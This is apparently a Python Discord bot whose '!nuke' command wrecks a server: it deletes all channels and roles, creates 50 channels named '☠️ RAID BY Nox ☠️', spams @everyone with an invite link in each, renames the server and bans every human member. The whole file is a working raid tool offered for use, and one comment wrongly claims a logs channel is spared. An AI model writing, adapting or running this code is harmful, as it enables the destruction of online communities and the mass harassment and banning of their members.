import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Nuke en cours...")
        try:
            # Supprimer tous les salons sauf celui des logs
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    print(f"Salon {channel.name} supprimé.")
                except Exception as e:
                    print(f"Erreur lors de la suppression du salon {channel.name}: {str(e)}")

            # Supprimer les rôles sauf @everyone
            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                        print(f"Rôle {role.name} supprimé.")
                    except Exception as e:
                        print(f"Erreur lors de la suppression du rôle {role.name}: {str(e)}")

            await ctx.send("Salons et rôles supprimés avec succès !")

            # Créer 50 salons et envoyer 5 messages dans chaque salon
            for i in range(50):
                try:
                    channel = await ctx.guild.create_text_channel(f"☠️ RAID BY Nox ☠️ {i+1}")
                    print(f"Salon {channel.name} créé.")

                    # Envoyer 5 messages dans chaque salon
                    for _ in range(5):
                        await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
                        await asyncio.sleep(0.1)  # Petite pause pour ne pas spammer trop vite

                except Exception as e:
                    print(f"Erreur lors de la création du salon ou de l'envoi des messages : {str(e)}")

            await ctx.send("50 salons créés et messages envoyés avec succès !")

            # Renommer le serveur
            try:
                await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")
                print("Serveur renommé avec succès.")
                await ctx.send("Serveur renommé avec succès !")
            except Exception as e:
                print(f"Erreur lors du renommage du serveur : {str(e)}")

            # Bannir tous les membres sauf les bots
            for member in ctx.guild.members:
                try:
                    if not member.bot:
                        await member.ban()
                        print(f"Membre {member.name} banni.")
                        await asyncio.sleep(0.2)  # Pause pour éviter trop de bannissements en même temps
                except Exception as e:
                    print(f"Erreur lors du bannissement du membre {member.name}: {str(e)}")

            print("Nuke terminé.")
            await ctx.send("Le nuke est terminé. Tous les membres ont été bannis.")

        except Exception as e:
            await ctx.send(f"Une erreur est survenue pendant le nuke : {str(e)}")
            print(f"Erreur : {str(e)}")
    else:
        await ctx.send("Tu n'as pas la permission d'utiliser cette commande.")

bot.run(os.getenv("TOKEN"))
